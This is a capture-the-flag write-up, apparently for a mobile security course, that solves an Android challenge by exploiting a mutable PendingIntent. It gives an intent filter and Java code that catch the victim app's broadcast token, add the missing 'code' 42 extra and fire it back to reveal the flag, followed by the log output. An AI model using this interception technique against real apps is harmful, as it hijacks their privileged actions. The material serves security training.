# Pending 

same as before, we only have an apk , get the flag 

___


## How to solve it 

### 1. Manifest file

lets see what we have on the manifest file 
- look for exported activity service receiver (endpoint) to interact with
- any mention to PendingIntent

```xml
<activity
            android:name="com.example.victimapp.MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
```

mainactivity is exported + intent filter 

flag logic must be on main activity 



### 2. MainActivity

did_someone_call_me(); -> main logic 

Pendign attack 
1. Victim create a pending Itent (show the flag)
2. need to caputre it and execute its action to get the flag 

PendingIntent activity = PendingIntent.getActivity(getApplicationContext(), 0, intent2, 33554432);
  - creating the pending intent

if (action.equals("mobiotsec.GIVE_FLAG")) { -> action -> mobiosec.GIVE_FLAG

BECAUSE PENDIGN IS MUTABLE ANYONE WHO RECEIVES THIS PENDING INTANTE CAN MODIGU THE INTENT INSIDE BEFORE EXECUTING IT 

leak -> app broadcast this pending intent intent 3 action -> mobiosec.MUTATE_ME

if (intent.getIntExtra("code", -1) == 42) { -> meands that app receives GIVE_FLAF action check for a PIN (42)


goal -> to create an app to intercept this call, add missing code 42 and fire the pending intent back 

### 3. intent filter 

in this case the direction of the conversation has flipped
- usually we're the caller 
- now we're the receiver 

<action android:name="mobiotsec.MUTATE_ME" -> intent3 action is broadcast 

need to define a filter to accept the calls 
```xml
<!-- 1. Define filter to catch custom intent broadcast -->
            <intent-filter>
                <action android:name="mobiotsec.MUTATE_ME" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
```


### 4. OnCreate 

1. Get the Intent that the Victim App sent to us

```java
        Intent receivedIntent = getIntent();
```

2. create pending item using key pending_intent

```java
 //The victim stored it under the key "pending_intent"
    PendingIntent victimToken = receivedIntent.getParcelableExtra("pending_intent");
``` 

3. if we have something putextra to add code = 42 + send it back

```java
if (victimToken != null) {
                try {
                    // 3. MODIFY: Create a new Intent with the missing password
                    // We do NOT need to set the class/package here; the PendingIntent already knows where to go.
                    Intent fillInIntent = new Intent();
                    fillInIntent.putExtra("code", 42); // The check: if (code == 42)

                    // 4. FIRE: Send the token back to the victim
                    // Because the PendingIntent is MUTABLE, Android merges our 'fillInIntent'
                    // with the original intent inside the token.
                    victimToken.send(this, 0, fillInIntent);

                    Log.i(TAG, "Exploit executed: PendingIntent sent with code 42");

                } catch (PendingIntent.CanceledException e) {
                    e.printStackTrace();
                }
            }
```



## Solution 
```bash
2026-01-21 19:42:17.787 14542-14542 MOBIOTSEC               com.example.victimapp                I  FLAG{per_angusta_ad_augusta}
```